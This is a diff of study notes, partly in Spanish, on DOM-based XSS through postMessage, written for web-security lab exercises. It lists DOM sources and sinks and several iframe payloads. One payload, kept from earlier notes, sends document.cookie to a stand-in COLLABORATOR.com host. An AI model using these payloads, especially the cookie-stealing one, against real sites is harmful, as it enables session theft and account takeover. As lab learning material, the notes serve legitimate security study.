@@ -1,7 +1,4 @@
-- AddEventListener
-	- ```<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">```
-	- ```<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">```
-	- ```<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>```
+
 - Check for DOM redirections (parameters hidden in source code)
 - Cookies containing URLs
 
@@ -9,6 +6,51 @@ Steal a cookie:
 ```
 <iframe src="https://TARGET.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=fetch(`https://COLLABORATOR.com?collector=`+btoa(document.cookie))>','*')">
 ```
+### Fuentes comunes
+
+```
+document.URL
+document.documentURI
+document.URLUnencoded
+document.baseURI
+location
+AddEventListener
+document.cookie
+document.referrer
+window.name
+history.pushState
+history.replaceState
+localStorage
+sessionStorage
+IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
+Database
+```
+### Sumideros Comunes:
+
+```
+document.write()
+document.writeln()
+document.domain
+element.innerHTML
+element.outerHTML
+element.insertAdjacentHTML
+element.onevent
+```
+
+<hr>
+
+- Source: **AddEventListener** `Primeros 3 labs, resumidos.`
+	- LAB: DOM XSS Web Messages
+    - `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">`
+
+	* LAB: DOM XSS Web Messages Javascript:url
+    - `<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">`
+    - 
+	*  LAB: DOM XSS Web Messages & **JSON** Parse
+    - `<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>`
+
+---
+
 ##### DOM XSS using web messages
 
 ```
